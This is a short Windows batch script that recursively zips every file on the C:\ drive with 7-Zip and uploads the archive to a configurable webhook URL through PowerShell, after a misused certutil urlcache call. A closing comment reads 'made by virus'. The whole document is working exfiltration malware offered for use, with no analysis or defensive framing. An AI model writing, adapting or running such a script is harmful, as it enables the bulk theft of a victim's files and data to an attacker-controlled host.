@echo off
setlocal enabledelayedexpansion

rem Set your webhhok 
set "webhook=https://your-webhook-url.com/upload"

rem Set the directory thats you want to tlyport like c:
set "startDir=C:\"

set "zipName=Files.zip"

rem Navigate through all files and directories
for /r "%startDir%" %%F in (*) do (
    set "filePath=%%F"
    rem Add the file to the zip file
    
    "C:\Program Files\7-Zip\7z.exe" a -tzip "!zipName!" "!filePath!" >nul
)

rem Upload the zip file to the webhook

certutil -f -split -urlcache -f "%zipName%" && certutil -f -urlcache "file:///%zipName%" && powershell -command "(New-Object System.Net.WebClient).UploadFile('%webhook%', '%zipName%')"

   rem made by virus